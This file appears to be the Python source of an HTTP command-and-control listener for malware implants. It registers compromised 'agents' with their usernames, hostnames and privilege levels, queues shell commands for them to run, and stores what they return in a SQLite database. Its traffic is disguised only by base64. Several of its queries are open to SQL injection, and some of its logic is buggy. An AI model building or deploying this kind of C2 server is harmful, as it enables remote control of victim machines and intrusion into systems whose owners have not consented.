#!/usr/bin/python3
"""
Usage::
    ./listener_http.py <ip ><port>
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
from sys import argv
import uuid
import os, sys
import re
from binascii import hexlify, unhexlify
import base64
from datetime import datetime
import sqlite3
import json


def decrypt(cipher):
		try:
			r = base64.b64decode(cipher).decode()
		except:
			r = cipher
		return r
	
def encrypt(plain):
		try:
			r = base64.b64encode(plain.encode())
		except:
			r = plain
		return r

class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def log_message(self, format, *args): # to not log on the screen
        return

    def do_GET(self):
        print("ok")
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('ISO-8859-1'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself

        post_data = decrypt(post_data)

        ip_address = self.client_address[0]
        endpoint = str(self.path)

        #self._set_response()

        ###########################################
        # REGISTER AN AGENT
        ###########################################
        if endpoint == "/agent":
            #print("[ok] /agent endpoint reached")
            body_array = json.loads(decrypt(post_data))

            body = {
                    "agent_uid": body_array["agent_uuid"].strip('\n'),
                    "agent_type": body_array["agent_type"].strip('\n'),
                    "agent_os": body_array["agent_os"].strip('\n'),
                    "activated": "yes",
                    "username": body_array["username"].strip('\n'),
                    "hostname": body_array["hostname"].strip('\n'),
                    "integrity_level": body_array["integrity_level"].strip('\n'),
                    "version": body_array["version"].strip('\n'),
                    "task_uid": "",
                    "cmd_result": "",
                    "cmd_request": "",
                    "cmd_arg": "",
                    "cmd_result_stdout": "",
                    "ip_address": ip_address,
                    "agent_name": body_array["agent_name"].strip('\n')
                    }
                
            create_update_agent(body)
            print("[+] registration of a new agent " + body["agent_uid"])
            on_registering_tasks = fetch_on_registering_task()
            print("[*] on-registering tasks added to the pulls of task of the agent " + body["agent_uid"])
            for task in on_registering_tasks:
                create_task_to_agent(body["agent_uid"], task)
                    
            self._set_response()
            self.wfile.write(unhexlify(b"30303031")) # 0001

        ###########################################
        # PROCESS TASK
        ###########################################
        elif endpoint == "/task":
            #print("[ok] /task endpoint reached")
            body_array = json.loads(decrypt(post_data))
            body = {
                    "agent_uid": body_array["agent_uuid"],
                    "task_uid": body_array["task_uuid"],
                    "cmd_result": body_array["cmd_result"],
                    "cmd_result_stdout": body_array["cmd_result_stdout"],
                    }

            update_last_check(body["agent_uid"])

            ### cmd_result
            if body["cmd_result"] == "0": # no -> there is probably an error into the agent cmd execution
                body["cmd_result"] = "no"
            elif body["cmd_result"] == "1": # yes
                body["cmd_result"] = "yes"
            else:
                body["cmd_result"] = "no"

            if body["cmd_result"] == "yes": # the task has been completed by the agent
                task_uid = body["task_uid"]
                cmd_result = body["cmd_result_stdout"]

                update_completed_task(task_uid, cmd_result)

                print("[+] task " + body["task_uid"] + " completed by agent " + body["agent_uid"])
            else:   # task not completed, do nothing
                pass
        
            #self._set_response()
            #self.wfile.write(unhexlify(b"01"))
            
        else:
            #print("[*] agent "+ body_array[0].decode('ISO-8859-1')+" tries to join an endpoint that not exist: "+endpoint)
            self._set_response()
            self.wfile.write("maybe you should try to fuck yourself".encode('ISO-8859-1'))

            # maybe you should deactivated the agent remotely in that case

        ###########################################
        # LOOK FOR A TASK AND SUBMIT IT IF FOUND
        ###########################################  
        agent_uid = body["agent_uid"]
        tasks = fetch_task(agent_uid) # find tasks where submitted = False

        if (tasks) and endpoint == "/task" and body["cmd_result"] == "no": # a task is found into the db, prepare it, then submit it
            #print(tasks[0])
            task_to_send = tasks[0]
            #print(tasks[0])
            print("[*] task " + task_to_send[1] + " being retrieved by listener from database")

            if task_to_send[6] == "CMD":
                task_to_send_1 = "CMD"
                task_to_send_2 = task_to_send[7]

            else: # there is an error, that command does not exists
                print("[!] error here proceeding task: command that not exists")
                self._set_response()
                self.wfile.write(encrypt("0")) 
            
            task_uid_to_send = task_to_send[1]
            update_submited_task(task_to_send[1])

            data_to_send = {}
            data_to_send["task_uuid"] = task_uid_to_send # uuid of the task
            data_to_send["cmd_request"] = task_to_send_1  # cmd_request, ex: CMD (0), L_SC (1)'
            data_to_send["cmd_arg"] = task_to_send_2  # cmd_arg, ex: whoami /groups
            print("[*] task " + task_to_send[1] + " sent to agent " + agent_uid)
            #print(data_to_send)
            self._set_response()
            self.wfile.write(encrypt(json.dumps(data_to_send)))

        else: # no task found
            self._set_response()
            a = {}
            a = json.dumps(a)
            self.wfile.write(encrypt(a)) 
        
                
def is_agent_exist(agent_uid):
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()
    print(agent_uid)
    cur.execute("SELECT * FROM agent WHERE agent_uid='%s'" %agent_uid)
    rows = cur.fetchall()
    con.close()

    if len(rows) == 0: # agent is not into the db, so it does not exist
        return False
    else: # the agent exist into the db
        return True

def fetch_agent_uid(agent_uid):
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()
    cur.execute("SELECT * FROM agent WHERE agent_uid=? ORDER BY agent_created_at DESC", (agent_uid,))
    rows = cur.fetchall()

    con.commit()
    con.close()

    return rows

def create_update_agent(body):
    today = datetime.now()

    r = fetch_agent_uid(body["agent_uid"])

    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()
    if len(r)==0: # this agent does not exist, so add it to the db
        created_at = today.strftime("%d/%m/%Y")
        last_check = today.strftime("%d/%m/%Y - %H:%M")
        group = "default"    
        cur.execute("INSERT INTO agent (agent_uid, agent_name, agent_group, agent_type, agent_os, agent_created_at, agent_last_check, agent_ip_address, agent_hostname, agent_username, agent_integrity_level, agent_version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);", (body["agent_uid"], body["agent_name"], group, body["agent_type"], body["agent_os"], created_at, last_check, body["ip_address"], body["hostname"], body["username"], body["integrity_level"], body["version"]))
    else:
        last_check = today.strftime("%d/%m/%Y - %H:%M")
        cur.execute("UPDATE agent SET agent_last_check=? WHERE agent_uid=?", (last_check, body["agent_uid"]))

    con.commit()
    con.close()
    
    return True

def update_last_check(agent_uid):
    today = datetime.now()
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()
    last_check = today.strftime("%d/%m/%Y - %H:%M")
    cur.execute("UPDATE agent SET agent_last_check=? WHERE agent_uid=?", (last_check, agent_uid))
    con.commit()
    con.close()
    return True

def fetch_on_registering_task():
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()

    cur.execute("SELECT * FROM on_registering_task ORDER BY task_created_at ASC")
    rows = cur.fetchall()

    con.close()

    return rows

def create_task_to_agent(agent_uid, task):
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()

    task_uid = str(uuid.uuid4())
    cur.execute("INSERT INTO task (task_uid, agent_uid, cmd_request, cmd_arg) VALUES (?, ?, ?, ?)", (task_uid, agent_uid, task[3], task[4]))
    con.commit()

    cur.execute("UPDATE task SET task_submited=False WHERE task_uid='%s'" %task_uid)
    rows = cur.fetchall()
    con.commit()

    con.close()

    return True

def fetch_task(agent_uid):
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()
    cur.execute("SELECT * FROM task WHERE agent_uid='%s' AND task_submited=False ORDER BY task_created_at ASC" %agent_uid)
    rows = cur.fetchall()

    con.close()

    return rows
    
def update_submited_task(task_uid):
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()
    cur.execute("UPDATE task SET task_submited=True WHERE task_uid='%s'" %task_uid)
    rows = cur.fetchall()

    con.commit()
    con.close()

    return rows

def update_completed_task(task_uid, cmd_result):
    con = sqlite3.connect(config["database_path"])
    cur = con.cursor()
    cur.execute("UPDATE task SET (task_completed, cmd_result)=(True, ?) WHERE task_uid=?", (cmd_result, task_uid))
    rows = cur.fetchall()

    con.commit()
    con.close()

    return rows

def run(server_class=HTTPServer, handler_class=S, ip="127.0.0.1", port=8080):
    
    server_address = (ip, port)
    httpd = server_class(server_address, handler_class)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()

if __name__ == '__main__':
    # ./listener <ip> <port>

    global config
    #print(os.getcwd())
    with open("./config.json", "r") as fp:
        config = fp.read()
    config = json.loads(config)
    #print(config)

    if len(argv) == 3:
        try:
            run(ip=argv[1], port=int(argv[2]))
        except Exception as e:
            print("error, is the IP ok?")
            print(str(e))
    else:
        print("./listener <ip> <port>")

